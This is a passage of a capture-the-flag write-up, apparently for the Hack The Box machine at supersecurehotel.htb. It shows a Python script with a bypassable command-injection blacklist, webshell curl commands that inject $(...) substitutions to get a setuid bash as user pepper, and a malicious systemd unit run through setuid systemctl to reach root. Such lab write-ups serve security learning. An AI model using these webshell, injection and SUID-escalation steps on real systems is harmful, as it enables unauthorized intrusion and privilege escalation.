  
def date_to_num(lines):  
   dat = datetime(1,1,1)  
   ip = ''  
   req=''  
   for i in lines:  
       if 'Level' in i:  
           fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]  
           regex = '(\d+)-(.*)-(\d+)(.*)'  
           logEx=re.match(regex, fecha).groups()  
           mes = to_dict(logEx[1])  
           fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]  
           fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')  
           if fecha > dat:  
               dat = fecha  
               req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]  
   return dat, req  
  
def to_dict(name):  
   month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}  
   return month_dict[name]  
  
def get_max_level(lines):  
   level=0  
   for j in lines:  
       if 'Level' in j:  
           if int(j.split(' ')[4]) > int(level):  
               level = j.split(' ')[4]  
               req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]  
   return level, req  
  
def exec_ping():  
   forbidden = ['&', ';', '-', '`', '||', '|']  
   command = input('Enter an IP: ')  
   for i in forbidden:  
       if i in command:  
           print('Got you')  
           exit()  
   os.system('ping ' + command)  
  
if __name__ == '__main__':  
   show_header()  
   if len(sys.argv) != 2:  
       show_help()  
       exit()  
   if sys.argv[1] == '-h' or sys.argv[1] == '--help':  
       show_help()  
       exit()  
   elif sys.argv[1] == '-s':  
       show_statistics()  
       exit()  
   elif sys.argv[1] == '-l':  
       list_ip()  
       exit()  
   elif sys.argv[1] == '-p':  
       exec_ping()  
       exit()  
   else:  
       show_help()  
       exit()
```

`def exec_ping()` tells us we need to `ping` an `IP address` for the script to work.

Unfortunately, the `ping` runs indefinitely and we never get the end of it.

So we try a `shell injection` :

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=echo+%27%24%28cp+/bin/bash+/tmp/pepper_bash%29%27+>/tmp/inject1.txt'  
  
       \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=cat+/tmp/inject1.txt'  
  
$(cp /bin/bash /tmp/pepper_bash)  
       \N      \N      \N      \N      \N      \N
```

Then, we use the `webshell` to become `pepper` :

```bash
>  curl -s --max-time 12 'http://supersecurehotel.htb/shell.php?c=timeout+4+bash+-c+%22cat+/tmp/inject1.txt+%7C+sudo+-u+pepper+/var/www/Admin-Utilities/simpler.py+-p%22'  
  
***********************************************  
    _                 _                          
___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _    
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |  
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |  
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |  
               |_|               |_|    |___/    
                               @ironhackers.es  
                                  
***********************************************  
  
Enter an IP:    \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=echo+%27%24%28chmod+%2Bs+/tmp/pepper_bash%29%27+>/tmp/inject2.txt'  
  
       \N      \N      \N      \N      \N      \N  
>  curl -s --max-time 12 'http://supersecurehotel.htb/shell.php?c=timeout+4+bash+-c+%22cat+/tmp/inject2.txt+%7C+sudo+-u+pepper+/var/www/Admin-Utilities/simpler.py+-p%22'  
  
***********************************************  
    _                 _                          
___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _    
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |  
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |  
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |  
               |_|               |_|    |___/    
                               @ironhackers.es  
                                  
***********************************************  
  
Enter an IP:    \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=ls+-la+/tmp/pepper_bash'  
  
-rwsr-sr-x 1 pepper pepper 1099016 Jun 24 22:10 /tmp/pepper_bash  
       \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+whoami'  
  
pepper  
       \N      \N      \N      \N      \N      \N
```

Now, we have the rights to read the user flag.

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27cat+/home/pepper/user.txt%27'  
  
[REDACTED — user flag · submit on HTB]
```

We continue towards privilege escalation.

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27whoami%27'  
  
pepper  
       \N      \N      \N      \N      \N      \N
```

We still hold the webshell as pepper.

We use `-perm -4000` for `SUID 4` to find interesting files :

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27find+/+-perm+-4000+-type+f+2>/dev/null%27'  
/bin/fusermount  
/bin/mount  
/bin/ping  
/bin/systemctl  
/bin/umount  
/bin/su  
/usr/bin/newgrp  
/usr/bin/passwd  
/usr/bin/gpasswd  
/usr/bin/chsh  
/usr/bin/sudo  
/usr/bin/chfn  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/tmp/pb  
/tmp/pepper_bash  
       \N      \N      \N      \N      \N      \N
```

We use `systemctl` to set `SUID` on `/bin/bash` so that `/bin/bash -p` becomes `root`.

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27printf+%22%5BUnit%5D%5CnDescription%3Dpwn%5Cn%5Cn%5BService%5D%5CnExecStart%3D%2Fbin%2Fchmod+u%2Bs+%2Fbin%2Fbash%5Cn%5Cn%5BInstall%5  
D%5CnWantedBy%3Dmulti-user.target%5Cn%22+%3E+/dev/shm/pwn.service%27'
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27cat+/dev/shm/pwn.service%27'  
  
[Unit]  
Description=pwn  
  
[Service]  
ExecStart=/bin/chmod u+s /bin/bash  
  
[Install]  
WantedBy=multi-user.target  
       \N      \N      \N      \N      \N      \N
```

```bash
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27/bin/systemctl+link+/dev/shm/pwn.service%27'  
  
       \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/tmp/pepper_bash+-p+-c+%27/bin/systemctl+start+pwn.service%27'  
  
       \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/bin/bash+-p+-c+%27id%27'  
  
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)  

```

We got `euid = 0 (root)`

```bash
       \N      \N      \N      \N      \N      \N  
>  curl -s 'http://supersecurehotel.htb/shell.php?c=/bin/bash+-p+-c+%27cat+/root/root.txt%27'  
  
[REDACTED — root flag · submit on HTB]  
       \N      \N      \N      \N      \N      \N
```

Root flag captured on-box; hash withheld per HTB policy. **Proof:** `euid=0(root)` on `id` before `cat /root/root.txt`.